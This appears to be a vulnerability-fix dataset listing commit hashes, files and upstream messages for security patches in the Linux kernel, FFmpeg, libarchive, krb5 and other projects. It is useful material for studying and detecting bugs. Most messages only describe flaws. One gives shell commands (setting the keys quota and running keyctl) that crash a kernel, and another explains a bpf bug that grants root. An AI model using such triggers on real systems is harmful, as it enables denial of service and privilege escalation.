    c53fbb3e0b8c6c8dd71558907945e9a5c0904ae3
Blob(s) Before Fix: 
    c53fbb3e0b8c6c8dd71558907945e9a5c0904ae3
Projects:
    0-T-0_ps4-linux
Commit Message for cac9b50b0d75a1d50d6c056ff65c005f3224c8e0:
USB: visor: fix null-deref at probe\n\nFix null-pointer dereference at probe should a (malicious) Treo device lack the expected endpoints.\n\nSpecifically, the Treo port-setup hack was dereferencing the bulk-in and interrupt-in urbs without first making sure they had been allocated by core.\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    689e59b7ffed34eba6159dcc78e87133862e3746
File(s) In Commit: 
    libavformat/mov.c
Blob(s) In Commit: 
    93f369125a27cad2c8737ca80f144e4ea5a931fe
Blob(s) Before Fix: 
    93f369125a27cad2c8737ca80f144e4ea5a931fe
Projects:
    00ERNEST00_FFmpeg
Commit Message for 689e59b7ffed34eba6159dcc78e87133862e3746:
mov: reset dref_count on realloc to keep values consistent.\n\nThis fixes a potential crash.\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    42cb14b110a5698ccf26ce59c4441722605a3743
File(s) In Commit: 
    mm/migrate.c
Blob(s) In Commit: 
    2834faba719a9e4ea1e49af6037d2b70efcf0ad2
Blob(s) Before Fix: 
    2834faba719a9e4ea1e49af6037d2b70efcf0ad2
Projects:
    0-T-0_ps4-linux
Commit Message for 42cb14b110a5698ccf26ce59c4441722605a3743:
mm: migrate dirty page without clear_page_dirty_for_io etc\n\nclear_page_dirty_for_io() has accumulated writeback and memcg subtleties since v2.6.16 first introduced page migration  and the set_page_dirty() which completed its migration of PageDirty, later had to be moderated to __set_page_dirty_nobuffers()  then PageSwapBacked had to skip that too.\n\nNo actual problems seen with this procedure recently, but if you look into what the clear_page_dirty_for_io(page)+set_page_dirty(newpage) is actually achieving, it turns out to be nothing more than moving the PageDirty flag, and its NR_FILE_DIRTY stat from one zone to another.\n\nIt would be good to avoid a pile of irrelevant decrementations and incrementations, and improper event counting, and unnecessary descent of the radix_tree under tree_lock (to set the PAGECACHE_TAG_DIRTY which radix_tree_replace_slot() left in place anyway).\n\nDo the NR_FILE_DIRTY movement, like the other stats movements, while interrupts still disabled in migrate_page_move_mapping()  and don't even bother if the zone is the same.  Do the PageDirty movement there under tree_lock too, where old page is frozen and newpage not yet visible: bearing in mind that as soon as newpage becomes visible in radix_tree, an un-page-locked set_page_dirty() might interfere (or perhaps that's just not possible: anything doing so should already hold an additional reference to the old page, preventing its migration  but play safe).\n\nBut we do still need to transfer PageDirty in migrate_page_copy(), for those who don't go the mapping route through migrate_page_move_mapping().\n\nSigned-off-by: Hugh Dickins <hughd@google.com> Cc: Christoph Lameter <cl@linux.com> Cc: "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com> Cc: Rik van Riel <riel@redhat.com> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: Davidlohr Bueso <dave@stgolabs.net> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Sasha Levin <sasha.levin@oracle.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    3b8d4de300854b3517c7acb239b84f7726c1353c
File(s) In Commit: 
    ext/zip/php_zip.c
Blob(s) In Commit: 
    7c9adf4af780a04b82bdb1facf849d07a60b8576
Blob(s) Before Fix: 
    7c9adf4af780a04b82bdb1facf849d07a60b8576
Projects:
    0014593_php-src
Commit Message for 3b8d4de300854b3517c7acb239b84f7726c1353c:
Fix bug #71923 - integer overflow in ZipArchive::getFrom*

======================================================================
Commit With Fix: 
    9f969b94c4b4f310865455d36db207de6cffebca
File(s) In Commit: 
    server/bin/pulp-gen-ca-certificate
Blob(s) In Commit: 
    f29d047d30a6128941e27dd439db95e3d4c68746
Blob(s) Before Fix: 
    f29d047d30a6128941e27dd439db95e3d4c68746
Projects:
    ATIX-AG_pulp
Commit Message for 9f969b94c4b4f310865455d36db207de6cffebca:
Use 4096 bits on the auth CA instead of 2048.

======================================================================
Commit With Fix: 
    8c6fe646ee79f5e55361b885b7efed5bec72d4a4
File(s) In Commit: 
    cloud/lxc/lxc_container.py
Blob(s) In Commit: 
    ae583fe4d72517d988022b2382e42c2f918e5b6a
Blob(s) Before Fix: 
    ae583fe4d72517d988022b2382e42c2f918e5b6a
Projects:
    00gh_ansible
Commit Message for 8c6fe646ee79f5e55361b885b7efed5bec72d4a4:
CVE-2016-3096: do not use predictable paths in lxc_container\n\n* do not use a predictable filename for the LXC attach script * don't use predictable filenames for LXC attach script logging * don't set a predictable archive_path\n\nthis should prevent symlink attacks which could result in * data corruption * data leakage * privilege escalation

======================================================================
Commit With Fix: 
    08c642c09c38a9c6454ab43a9b53b2a89b9eef99
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c
Blob(s) In Commit: 
    79c4cf05cc2f6b2da394aa4bcdc9c29fa573fd0f
Blob(s) Before Fix: 
    79c4cf05cc2f6b2da394aa4bcdc9c29fa573fd0f
Projects:
    3van_krb5
Commit Message for 08c642c09c38a9c6454ab43a9b53b2a89b9eef99:
Fix LDAP null deref on empty arg [CVE-2016-3119]\n\nIn the LDAP KDB module's process_db_args(), strtok_r() may return NULL if there is an empty string in the db_args array.  Check for this case and avoid dereferencing a null pointer.\n\nCVE-2016-3119:\n\nIn MIT krb5 1.6 and later, an authenticated attacker with permission to modify a principal entry can cause kadmind to dereference a null pointer by supplying an empty DB argument to the modify_principal command, if kadmind is configured to use the LDAP KDB module.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:ND\n\nticket: 8383 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    d157bd761585605b7882935ffb86286919f62ea1
File(s) In Commit: 
    net/netfilter/x_tables.c
Blob(s) In Commit: 
    582c9cfd6567ce4c7d5b3f86c15732b33a63e1b4
Blob(s) Before Fix: 
    582c9cfd6567ce4c7d5b3f86c15732b33a63e1b4
Projects:
    0-T-0_ps4-linux
Commit Message for d157bd761585605b7882935ffb86286919f62ea1:
netfilter: x_tables: check for size overflow\n\nBen Hawkes says:  integer overflow in xt_alloc_table_info, which on 32-bit systems can  lead to small structure allocation and a copy_from_user based heap  corruption.\n\nReported-by: Ben Hawkes <hawkes@google.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    4e9a0b05257f29cf4b75f3209243ed71614d062e
File(s) In Commit: 
    drivers/usb/serial/mct_u232.c
Blob(s) In Commit: 
    885655315de15a4b28db64da22f5d94bea7c8ea9
Blob(s) Before Fix: 
    885655315de15a4b28db64da22f5d94bea7c8ea9
Projects:
    0-T-0_ps4-linux
Commit Message for 4e9a0b05257f29cf4b75f3209243ed71614d062e:
USB: mct_u232: add sanity checking in probe\n\nAn attack using the lack of sanity checking in probe is known. This patch checks for the existence of a second port.\n\nCVE-2016-3136\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org [johan: add error message ] Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    c55aee1bf0e6b6feec8b2927b43f7a09a6d5f754
File(s) In Commit: 
    drivers/usb/serial/cypress_m8.c
Blob(s) In Commit: 
    bbeeb2bd55a83cebf4cfec9b4b8f2876edde1ca0
Blob(s) Before Fix: 
    bbeeb2bd55a83cebf4cfec9b4b8f2876edde1ca0
Projects:
    0-T-0_ps4-linux
Commit Message for c55aee1bf0e6b6feec8b2927b43f7a09a6d5f754:
USB: cypress_m8: add endpoint sanity check\n\nAn attack using missing endpoints exists.\n\nCVE-2016-3137\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    8835ba4a39cf53f705417b3b3a94eb067673f2c9
File(s) In Commit: 
    drivers/usb/class/cdc-acm.c
Blob(s) In Commit: 
    83fd30b0577c55f33eace402617ff3a2a4b09126
Blob(s) Before Fix: 
    83fd30b0577c55f33eace402617ff3a2a4b09126
Projects:
    0-T-0_ps4-linux
Commit Message for 8835ba4a39cf53f705417b3b3a94eb067673f2c9:
USB: cdc-acm: more sanity checking\n\nAn attack has become available which pretends to be a quirky device circumventing normal sanity checks and crashes the kernel by an insufficient number of interfaces. This patch adds a check to the code path for quirky devices.\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    5a07975ad0a36708c6b0a5b9fea1ff811d0b0c1f
File(s) In Commit: 
    drivers/usb/serial/digi_acceleport.c
Blob(s) In Commit: 
    16e8e37b3b36d521749ec48d17b2becfc4ae4f51
Blob(s) Before Fix: 
    16e8e37b3b36d521749ec48d17b2becfc4ae4f51
Projects:
    0-T-0_ps4-linux
Commit Message for 5a07975ad0a36708c6b0a5b9fea1ff811d0b0c1f:
USB: digi_acceleport: do sanity checking for the number of ports\n\nThe driver can be crashed with devices that expose crafted descriptors with too few endpoints.\n\nSee: http://seclists.org/bugtraq/2016/Mar/61\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> [johan: fix OOB endpoint check and add error messages ] Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    140ee8d2204b383279f854802b27bdb41c1d5d1a
File(s) In Commit: 
    minissdpd/minissdpd.c
Blob(s) In Commit: 
    5e79293e015c46bddd3fcf3247db9ec4214d78c7
Blob(s) Before Fix: 
    5e79293e015c46bddd3fcf3247db9ec4214d78c7
Projects:
    007jasonsmith_Catch
Commit Message for 140ee8d2204b383279f854802b27bdb41c1d5d1a:
minissdpd.c: Initialize pointers to NULL (fix)

======================================================================
Commit With Fix: 
    8b8addf891de8a00e4d39fc32f93f7c5eb8feceb
File(s) In Commit: 
    arch/x86/mm/mmap.c
Blob(s) In Commit: 
    389939f74dd5a544f16c9c4012c5a105d2420e45
Blob(s) Before Fix: 
    389939f74dd5a544f16c9c4012c5a105d2420e45
Projects:
    0-T-0_ps4-linux
Commit Message for 8b8addf891de8a00e4d39fc32f93f7c5eb8feceb:
x86/mm/32: Enable full randomization on i386 and X86_32\n\nCurrently on i386 and on X86_64 when emulating X86_32 in legacy mode, only the stack and the executable are randomized but not other mmapped files (libraries, vDSO, etc.). This patch enables randomization for the libraries, vDSO and mmap requests on i386 and in X86_32 in legacy mode.\n\nBy default on i386 there are 8 bits for the randomization of the libraries, vDSO and mmaps which only uses 1MB of VA.\n\nThis patch preserves the original randomness, using 1MB of VA out of 3GB or 4GB. We think that 1MB out of 3GB is not a big cost for having the ASLR.\n\nThe first obvious security benefit is that all objects are randomized (not only the stack and the executable) in legacy mode which highly increases the ASLR effectiveness, otherwise the attackers may use these non-randomized areas. But also sensitive setuid/setgid applications are more secure because currently, attackers can disable the randomization of these applications by setting the ulimit stack to "unlimited". This is a very old and widely known trick to disable the ASLR in i386 which has been allowed for too long.\n\nAnother trick used to disable the ASLR was to set the ADDR_NO_RANDOMIZE personality flag, but fortunately this doesn't work on setuid/setgid applications because there is security checks which clear Security-relevant flags.\n\nThis patch always randomizes the mmap_legacy_base address, removing the possibility to disable the ASLR by setting the stack to "unlimited".\n\nSigned-off-by: Hector Marco-Gisbert <hecmargi@upv.es> Acked-by: Ismael Ripoll Ripoll <iripoll@upv.es> Acked-by: Kees Cook <keescook@chromium.org> Acked-by: Arjan van de Ven <arjan@linux.intel.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: akpm@linux-foundation.org Cc: kees Cook <keescook@chromium.org> Link: http://lkml.kernel.org/r/1457639460-5242-1-git-send-email-hecmargi@upv.es Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    a0ad220c96692eda76b2e3fd7279f3dcd1d8a8ff
File(s) In Commit: 
    drivers/input/misc/ims-pcu.c
Blob(s) In Commit: 
    9c0ea36913b4a98293911f62a2d649dc08a855cd
Blob(s) Before Fix: 
    9c0ea36913b4a98293911f62a2d649dc08a855cd
Projects:
    0-T-0_ps4-linux
Commit Message for a0ad220c96692eda76b2e3fd7279f3dcd1d8a8ff:
Input: ims-pcu - sanity check against missing interfaces\n\nA malicious device missing interface can make the driver oops. Add sanity checking.\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    d7a6be58edc01b1c66ecd8fcc91236bfbce0a420
File(s) In Commit: 
    drivers/acpi/apei/einj.c
Blob(s) In Commit: 
    8c1e5f17fb3da11d6151fa873db6de1684829211
Blob(s) Before Fix: 
    8c1e5f17fb3da11d6151fa873db6de1684829211
Projects:
    0-T-0_ps4-linux
Commit Message for d7a6be58edc01b1c66ecd8fcc91236bfbce0a420:
acpi: Disable APEI error injection if securelevel is set\n\nACPI provides an error injection mechanism, EINJ, for debugging and testing the ACPI Platform Error Interface (APEI) and other RAS features. If supported by the firmware, ACPI specification 5.0 and later provide for a way to specify a physical memory address to which to inject the error.\n\nInjecting errors through EINJ can produce errors which to the platform are indistinguishable from real hardware errors. This can have undesirable side-effects, such as causing the platform to mark hardware as needing replacement.\n\nWhile it does not provide a method to load unauthenticated privileged code, the effect of these errors may persist across reboots and affect trust in the underlying hardware, so disable error injection through EINJ if securelevel is set.\n\nSigned-off-by: Linn Crosetto <linn@hpe.com>

======================================================================
Commit With Fix: 
    69af385de62ea68e2e608335cffbb0f4aa3db091
File(s) In Commit: 
    libcontainer/user/user.go
Blob(s) In Commit: 
    9f4c2cb5b40acf32fc4034ee70a90350220bd122
Blob(s) Before Fix: 
    9f4c2cb5b40acf32fc4034ee70a90350220bd122
Projects:
    0xffea_runc
Commit Message for 69af385de62ea68e2e608335cffbb0f4aa3db091:
libcontainer: user: always treat numeric ids numerically\n\nMost shadow-related tools don't treat numeric ids as potential usernames, so change our behaviour to match that. Previously, using an explicit specification like 111:222 could result in the UID and GID not being 111 and 222 respectively (which is confusing).\n\nSigned-off-by: Aleksa Sarai <asarai@suse.de>

======================================================================
Commit With Fix: 
    9842df62004f366b9fed2423e24df10542ee0dc5
File(s) In Commit: 
    arch/x86/kvm/mtrr.c
Blob(s) In Commit: 
    c146f3c262c3bdd43f83e736688147559a8e9a4f
Blob(s) Before Fix: 
    c146f3c262c3bdd43f83e736688147559a8e9a4f
Projects:
    0-T-0_ps4-linux
Commit Message for 9842df62004f366b9fed2423e24df10542ee0dc5:
KVM: MTRR: remove MSR 0x2f8\n\nMSR 0x2f8 accessed the 124th Variable Range MTRR ever since MTRR support was introduced by 9ba075a664df ("KVM: MTRR support").\n\n0x2f8 became harmful when 910a6aae4e2e ("KVM: MTRR: exactly define the size of variable MTRRs") shrinked the array of VR MTRRs from 256 to 8, which made access to index 124 out of bounds.  The surrounding code only WARNs in this situation, thus the guest gained a limited read/write access to struct kvm_arch_vcpu.\n\n0x2f8 is not a valid VR MTRR MSR, because KVM has/advertises only 16 VR MTRR MSRs, 0x200-0x20f.  Every VR MTRR is set up using two MSRs, 0x2f8 was treated as a PHYSBASE and 0x2f9 would be its PHYSMASK, but 0x2f9 was not implemented in KVM, therefore 0x2f8 could never do anything useful and getting rid of it is safe.\n\nThis fixes CVE-2016-3713.\n\nFixes: 910a6aae4e2e ("KVM: MTRR: exactly define the size of variable MTRRs") Cc: stable@vger.kernel.org Reported-by: David Matlack <dmatlack@google.com> Signed-off-by: Andy Honig <ahonig@google.com> Signed-off-by: Radim Krčmář <rkrcmar@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    9706d125b42481178d2b423de245f5d2faadbf40
File(s) In Commit: 
    gluon/globals.py
Blob(s) In Commit: 
    4f9ff81101a0320e1a49aebf3833dbe4ec321849
Blob(s) Before Fix: 
    4f9ff81101a0320e1a49aebf3833dbe4ec321849
Projects:
    2089764_web2py
Commit Message for 9706d125b42481178d2b423de245f5d2faadbf40:
DO NOT LEAK GLOBALS SETTINGS INTO request object

======================================================================
Commit With Fix: 
    b348d7dddb6c4fbfc810b7a0626e8ec9e29f7cbb
File(s) In Commit: 
    drivers/usb/usbip/usbip_common.c
Blob(s) In Commit: 
    e40da7759a0e6cd3a55bccdf90bb10284376ab11
Blob(s) Before Fix: 
    e40da7759a0e6cd3a55bccdf90bb10284376ab11
Projects:
    0-T-0_ps4-linux
Commit Message for b348d7dddb6c4fbfc810b7a0626e8ec9e29f7cbb:
USB: usbip: fix potential out-of-bounds write\n\nFix potential out-of-bounds write to urb->transfer_buffer usbip handles network communication directly in the kernel. When receiving a packet from its peer, usbip code parses headers according to protocol. As part of this parsing urb->actual_length is filled. Since the input for urb->actual_length comes from the network, it should be treated as untrusted. Any entity controlling the network may put any value in the input and the preallocated urb->transfer_buffer may not be large enough to hold the data. Thus, the malicious entity is able to write arbitrary data to kernel memory.\n\nSigned-off-by: Ignat Korchagin <ignat.korchagin@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    4e0d9b0b9740d258ade40cce248c93777362ac1e
File(s) In Commit: 
    libImaging/Resample.c
Blob(s) In Commit: 
    0d401c1df998373676475ab880dfa3501fa4caa3
Blob(s) Before Fix: 
    0d401c1df998373676475ab880dfa3501fa4caa3
Projects:
    0x0all_pillow-simd
Commit Message for 4e0d9b0b9740d258ade40cce248c93777362ac1e:
fix integer overflow in Resample.c

======================================================================
Commit With Fix: 
    e79ef306afe332faf22e9b442a2c6b59cb175573
File(s) In Commit: 
    libarchive/archive_read_support_format_7zip.c
Blob(s) In Commit: 
    1dfe52b8539a0fd0cc9132db3ce56b51e412d42c
Blob(s) Before Fix: 
    1dfe52b8539a0fd0cc9132db3ce56b51e412d42c
Projects:
    AasemShokr_libarchive
Commit Message for e79ef306afe332faf22e9b442a2c6b59cb175573:
Issue #718: Fix TALOS-CAN-152\n\nIf a 7-Zip archive declares a rediculously large number of substreams, it can overflow an internal counter, leading a subsequent memory allocation to be too small for the substream data.\n\nThanks to the Open Source and Threat Intelligence project at Cisco for reporting this issue.

======================================================================
Commit With Fix: 
    a550daeecf6bc689ade371349892ea17b5b97c77
File(s) In Commit: 
    libarchive/archive_read_support_format_mtree.c
Blob(s) In Commit: 
    8c3be9a294f8789c2d32756ae6f0ae16461e37ab
Blob(s) Before Fix: 
    8c3be9a294f8789c2d32756ae6f0ae16461e37ab
Projects:
    AasemShokr_libarchive
Commit Message for a550daeecf6bc689ade371349892ea17b5b97c77:
Fix libarchive/archive_read_support_format_mtree.c:1388:11: error: array subscript is above array bounds

======================================================================
Commit With Fix: 
    05caadc7eedbef471ac9610809ba683f0c698700
File(s) In Commit: 
    libarchive/archive_read_support_format_rar.c
Blob(s) In Commit: 
    6c49f1a1501c9d341dd7ea2f843d3016a1ecfc7b
Blob(s) Before Fix: 
    6c49f1a1501c9d341dd7ea2f843d3016a1ecfc7b
Projects:
    AasemShokr_libarchive
Commit Message for 05caadc7eedbef471ac9610809ba683f0c698700:
Issue 719:  Fix for TALOS-CAN-154\n\nA RAR file with an invalid zero dictionary size was not being rejected, leading to a zero-sized allocation for the dictionary storage which was then overwritten during the dictionary initialization.\n\nThanks to the Open Source and Threat Intelligence project at Cisco for reporting this.

======================================================================
Commit With Fix: 
    b329a14adc40868965076a77210452e396243dcd
File(s) In Commit: 
    symphony/lib/core/class.session.php
Blob(s) In Commit: 
    dedb526fa88600a25a993ae8e8ef9ebfe4cde4f8
Blob(s) Before Fix: 
    dedb526fa88600a25a993ae8e8ef9ebfe4cde4f8
Projects:
    1900_symphony-2
Commit Message for b329a14adc40868965076a77210452e396243dcd:
Better php.ini overrides for insecure setups\n\nThis change is to protect our users against a poorly setup server. PHP can allow pretty scary things security-wise, so it's best to make sure things that can only have one valid setting should be enforced.\n\nThanks to @hyp3rlinx for this.

======================================================================
Commit With Fix: 
    3ce424e45411cf5a13105e0386b6ecf6eeb4f66f
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    378a23ab60938b7be5202483208f908d51e57a13
Blob(s) Before Fix: 
    378a23ab60938b7be5202483208f908d51e57a13
Projects:
    0-T-0_ps4-linux
Commit Message for 3ce424e45411cf5a13105e0386b6ecf6eeb4f66f:
kvm:vmx: more complete state update on APICv on/off\n\nThe function to update APICv on/off state (in particular, to deactivate it when enabling Hyper-V SynIC) is incomplete: it doesn't adjust APICv-related fields among secondary processor-based VM-execution controls.  As a result, Windows 2012 guests get stuck when SynIC-based auto-EOI interrupt intersected with e.g. an IPI in the guest.\n\nIn addition, the MSR intercept bitmap isn't updated every time "virtualize x2APIC mode" is toggled.  This path can only be triggered by a malicious guest, because Windows didn't use x2APIC but rather their own synthetic APIC access MSRs  however a guest running in a SynIC-enabled VM could switch to x2APIC and thus obtain direct access to host APIC MSRs (CVE-2016-4440).\n\nThe patch fixes those omissions.\n\nSigned-off-by: Roman Kagan <rkagan@virtuozzo.com> Reported-by: Steve Rutherford <srutherford@google.com> Reported-by: Yang Zhang <yang.zhang.wz@gmail.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    5cd60033ea7f5bdf8c19c27b23ea2d773d9b09f5
File(s) In Commit: 
    plugins/src/allow_execmod.py
Blob(s) In Commit: 
    42f27518974fd52bdbb088d4c540218657ff1935
Blob(s) Before Fix: 
    42f27518974fd52bdbb088d4c540218657ff1935
Projects:
    Alphadelta14_apparmor
Commit Message for 5cd60033ea7f5bdf8c19c27b23ea2d773d9b09f5:
plugins: get rid of commands.getstatusoutput()

======================================================================
Commit With Fix: 
    38327424b40bcebe2de92d07312c89360ac9229a
File(s) In Commit: 
    security/keys/key.c
Blob(s) In Commit: 
    346fbf201c22e37e67dc58b5684c868e79ad9af5
Blob(s) Before Fix: 
    346fbf201c22e37e67dc58b5684c868e79ad9af5
Projects:
    0-T-0_ps4-linux
Commit Message for 38327424b40bcebe2de92d07312c89360ac9229a:
KEYS: potential uninitialized variable\n\nIf __key_link_begin() failed then "edit" would be uninitialized.  I've added a check to fix that.\n\nThis allows a random user to crash the kernel, though it's quite difficult to achieve.  There are three ways it can be done as the user would have to cause an error to occur in __key_link():\n\n (1) Cause the kernel to run out of memory.  In practice, this is difficult      to achieve without ENOMEM cropping up elsewhere and aborting the      attempt.\n\n (2) Revoke the destination keyring between the keyring ID being looked up      and it being tested for revocation.  In practice, this is difficult to      time correctly because the KEYCTL_REJECT function can only be used      from the request-key upcall process.  Further, users can only make use      of what's in /sbin/request-key.conf, though this does including a      rejection debugging test - which means that the destination keyring      has to be the caller's session keyring in practice.\n\n (3) Have just enough key quota available to create a key, a new session      keyring for the upcall and a link in the session keyring, but not then      sufficient quota to create a link in the nominated destination keyring      so that it fails with EDQUOT.\n\nThe bug can be triggered using option (3) above using something like the following:\n\n	echo 80 >/proc/sys/kernel/keys/root_maxbytes 	keyctl request2 user debug:fred negate @t\n\nThe above sets the quota to something much lower (80) to make the bug easier to trigger, but this is dependent on the system.  Note also that the name of the keyring created contains a random number that may be between 1 and 10 characters in size, so may throw the test off by changing the amount of quota used.\n\nAssuming the failure occurs, something like the following will be seen:\n\n	kfree_debugcheck: out of range ptr 6b6b6b6b6b6b6b68h 	------------[ cut here ]------------ 	kernel BUG at ../mm/slab.c:2821! 	... 	RIP: 0010:[<ffffffff811600f9>] kfree_debugcheck+0x20/0x25 	RSP: 0018:ffff8804014a7de8  EFLAGS: 00010092 	RAX: 0000000000000034 RBX: 6b6b6b6b6b6b6b68 RCX: 0000000000000000 	RDX: 0000000000040001 RSI: 00000000000000f6 RDI: 0000000000000300 	RBP: ffff8804014a7df0 R08: 0000000000000001 R09: 0000000000000000 	R10: ffff8804014a7e68 R11: 0000000000000054 R12: 0000000000000202 	R13: ffffffff81318a66 R14: 0000000000000000 R15: 0000000000000001 	... 	Call Trace: 	  kfree+0xde/0x1bc 	  assoc_array_cancel_edit+0x1f/0x36 	  __key_link_end+0x55/0x63 	  key_reject_and_link+0x124/0x155 	  keyctl_reject_key+0xb6/0xe0 	  keyctl_negate_key+0x10/0x12 	  SyS_keyctl+0x9f/0xe7 	  do_syscall_64+0x63/0x13a 	  entry_SYSCALL64_slow_path+0x25/0x25\n\nFixes: f70e2e06196a ('KEYS: Do preallocation for __key_link()') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    87580d767868360d2fed503980129504da84b63e
File(s) In Commit: 
    modules/transport/xmlrpc/xmlrpclib.c
Blob(s) In Commit: 
    5fcde9e474de7a59974e375e0a50479dfcc35332
Blob(s) Before Fix: 
    5fcde9e474de7a59974e375e0a50479dfcc35332
Projects:
    Acidburn0zzz_atheme
Commit Message for 87580d767868360d2fed503980129504da84b63e:
Do not copy more bytes than were allocated

======================================================================
Commit With Fix: 
    681fef8380eb818c0b845fca5d2ab1dcbab114ee
File(s) In Commit: 
    drivers/usb/core/devio.c
Blob(s) In Commit: 
    e9f5043a2167c2be13fb3cd5b5aab93efa7d9c23
Blob(s) Before Fix: 
    e9f5043a2167c2be13fb3cd5b5aab93efa7d9c23
Projects:
    0-T-0_ps4-linux
Commit Message for 681fef8380eb818c0b845fca5d2ab1dcbab114ee:
USB: usbfs: fix potential infoleak in devio\n\nThe stack object “ci” has a total size of 8 bytes. Its last 3 bytes are padding bytes which are not initialized and leaked to userland via “copy_to_user”.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    b8670c09f37bdf2847cc44f36511a53afc6161fd
File(s) In Commit: 
    net/llc/af_llc.c
Blob(s) In Commit: 
    8ae3ed97d95cb4a5f05b69b8c2922d57072a6fd1
Blob(s) Before Fix: 
    8ae3ed97d95cb4a5f05b69b8c2922d57072a6fd1
Projects:
    0-T-0_ps4-linux
Commit Message for b8670c09f37bdf2847cc44f36511a53afc6161fd:
net: fix infoleak in llc\n\nThe stack object “info” has a total size of 12 bytes. Its last byte is padding which is not initialized and leaked via “put_cmsg”.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5f8e44741f9f216e33736ea4ec65ca9ac03036e6
File(s) In Commit: 
    net/core/rtnetlink.c
Blob(s) In Commit: 
    65763c29f84549583cf55546ff9a45bbe921a598
Blob(s) Before Fix: 
    65763c29f84549583cf55546ff9a45bbe921a598
Projects:
    0-T-0_ps4-linux
Commit Message for 5f8e44741f9f216e33736ea4ec65ca9ac03036e6:
net: fix infoleak in rtnetlink\n\nThe stack object “map” has a total size of 32 bytes. Its last 4 bytes are padding generated by compiler. These padding bytes are not initialized and sent out via “nla_put”.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
File(s) In Commit: 
    kernel/bpf/verifier.c
Blob(s) In Commit: 
    db2574e7b8b008395bb8fee53baf513fdc56c392
Blob(s) Before Fix: 
    db2574e7b8b008395bb8fee53baf513fdc56c392
Projects:
    0-T-0_ps4-linux
Commit Message for 8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7:
bpf: fix double-fdput in replace_map_fd_with_map_ptr()\n\nWhen bpf(BPF_PROG_LOAD, ...) was invoked with a BPF program whose bytecode references a non-map file descriptor as a map file descriptor, the error handling code called fdput() twice instead of once (in __bpf_map_get() and in replace_map_fd_with_map_ptr()). If the file descriptor table of the current task is shared, this causes f_count to be decremented too much, allowing the struct file to be freed while it is still in use (use-after-free). This can be exploited to gain root privileges by an unprivileged user.\n\nThis bug was introduced in commit 0246e64d9a5f ("bpf: handle pseudo BPF_LD_IMM64 insn"), but is only exploitable since commit 1be7f75d1668 ("bpf: enable non-root eBPF programs") because previously, CAP_SYS_ADMIN was required to reach the vulnerable code.\n\n(posted publicly according to request by maintainer)\n\nSigned-off-by: Jann Horn <jannh@google.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Acked-by: Alexei Starovoitov <ast@kernel.org> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2c1f6951a8a82e6de0d82b1158b5e493fc6c54ab
File(s) In Commit: 
    drivers/media/v4l2-core/videobuf2-v4l2.c
Blob(s) In Commit: 
    8da7470ca364cbff7e17ed565240195c0e418d5a
Blob(s) Before Fix: 
    8da7470ca364cbff7e17ed565240195c0e418d5a
Projects:
    0-T-0_ps4-linux
Commit Message for 2c1f6951a8a82e6de0d82b1158b5e493fc6c54ab:
